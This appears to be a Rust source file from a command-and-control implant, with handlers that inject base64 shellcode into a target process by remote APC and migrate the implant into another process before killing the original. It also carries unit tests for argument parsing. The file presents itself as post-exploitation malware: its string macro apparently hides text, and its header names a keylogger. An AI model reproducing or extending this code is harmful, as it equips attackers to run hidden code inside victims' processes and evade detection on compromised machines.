// src/agent/handlers/process.rs — Process injection, migration, keylogger

use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};

use crate::agent::injection;
use crate::agent::migrate;
use crate::lc;
use super::{HandlerContext, DispatchResult, AgentAction, lock_or_action};

// ── Process Injection ──────────────────────────────────────────────────

pub async fn handle_injection(cmd: String) -> (String, String, i32) {
    let parts: Vec<String> = cmd.split_whitespace().map(|s| s.to_string()).collect();
    if parts.len() != 3 {
        return (String::new(), lc!("Usage: proc:inject <pid> <base64_shellcode>"), 1);
    }
    let (pid, shellcode) = match (parts[1].parse::<u32>(), BASE64.decode(&parts[2])) {
        (Ok(p), Ok(s)) => (p, s),
        (Err(_), _) => return (String::new(), format!("{}: {}", lc!("Invalid PID"), parts[1]), 1),
        (_, Err(_)) => return (String::new(), lc!("Invalid Base64 Shellcode"), 1),
    };
    let code_len = shellcode.len();
    let task_result = tokio::task::spawn_blocking(move || {
        std::panic::catch_unwind(|| injection::inject_remote_apc(pid, &shellcode))
    }).await;
    match task_result {
        Ok(Ok(Ok(_)))  => (format!("{} {} {} {}", lc!("Success: Injected"), code_len, lc!("bytes into PID"), pid), String::new(), 0),
        Ok(Ok(Err(e))) => (String::new(), format!("{}: {}", lc!("Injection Failed"), e), 1),
        Ok(Err(_))     => (String::new(), lc!("Injection Panic: Caught critical failure in injection module."), 1),
        Err(e)         => (String::new(), format!("{}: {}", lc!("Task execution failed"), e), 1),
    }
}

// ── Process Migration ──────────────────────────────────────────────────

pub fn handle_migrate_spawn(ctx: &HandlerContext, binary: &str, req_id: u64) -> DispatchResult {
    let binary = binary.trim().to_string();
    let desc = format!("migrate:spawn {}", binary);
    let job_id = lock_or_action!(ctx.job_manager, "job_manager").spawn(desc, req_id, move |sink| {
        async move {
            sink.send_chunk("[*] Reading self binary...").await;
            let result = tokio::task::spawn_blocking(move || migrate::migrate_spawn(&binary))
                .await.unwrap_or_else(|e| Err(format!("Task: {}", e)));
            match result {
                Ok(msg) => {
                    sink.send_chunk(&msg).await;
                    sink.send_chunk("[*] Migration successful. Exiting old process in 5s...").await;
                    tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
                    std::process::exit(0);
                }
                Err(e) => { sink.send_chunk(&format!("[-] Migration failed: {}", e)).await; (String::new(), e, 1) }
            }
        }
    });
    DispatchResult::Reply(format!("Migration launched as Job {}", job_id), String::new(), 0, AgentAction::None)
}

pub fn handle_migrate_inject(ctx: &HandlerContext, args: &str, req_id: u64) -> DispatchResult {
    let pid = args.trim().parse::<u32>().unwrap_or(0);
    if pid == 0 {
        return DispatchResult::Reply(String::new(), lc!("Usage: migrate:inject <pid>"), 1, AgentAction::None);
    }
    let desc = format!("migrate:inject PID {}", pid);
    let job_id = lock_or_action!(ctx.job_manager, "job_manager").spawn(desc, req_id, move |sink| {
        async move {
            sink.send_chunk(&format!("[*] Injecting into PID {}...", pid)).await;
            let result = tokio::task::spawn_blocking(move || migrate::migrate_inject(pid))
                .await.unwrap_or_else(|e| Err(format!("Task: {}", e)));
            match result {
                Ok(msg) => {
                    sink.send_chunk(&msg).await;
                    sink.send_chunk("[*] Migration successful. Exiting old process in 5s...").await;
                    tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
                    std::process::exit(0);
                }
                Err(e) => { sink.send_chunk(&format!("[-] {}", e)).await; (String::new(), e, 1) }
            }
        }
    });
    DispatchResult::Reply(format!("Migration launched as Job {}", job_id), String::new(), 0, AgentAction::None)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn injection_bad_args() {
        let (_, err, code) = handle_injection("proc:inject only_one".into()).await;
        assert_eq!(code, 1);
        assert!(err.contains("Usage"));
    }

    #[tokio::test]
    async fn injection_bad_pid() {
        let (_, err, code) = handle_injection("proc:inject abc AAAA".into()).await;
        assert_eq!(code, 1);
        assert!(err.contains("Invalid PID"));
    }

    #[tokio::test]
    async fn injection_bad_base64() {
        let (_, err, code) = handle_injection("proc:inject 1234 !!!invalid!!!".into()).await;
        assert_eq!(code, 1);
        assert!(err.contains("Base64"));
    }
}
